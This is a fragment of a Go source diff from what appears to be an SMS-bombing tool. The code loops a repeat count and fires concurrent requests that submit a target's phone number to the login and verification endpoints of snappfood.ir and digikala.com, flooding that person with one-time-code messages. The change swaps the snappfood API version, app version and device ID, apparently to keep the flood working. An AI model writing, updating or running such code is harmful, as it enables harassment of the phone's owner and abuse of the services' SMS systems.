@@ -108,7 +108,7 @@ func main() {
 	ch := make(chan int)
 
 	for i := 0; i < repeatCount; i++ {
-		go sms("https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=0d436e7f-7345-4ed5-a283-01a8956b5fd4&locale=fa", map[string]interface{}{
+		go sms("https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa", map[string]interface{}{
 			"cellphone": phone,
 		}, ch)
 		go sms("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
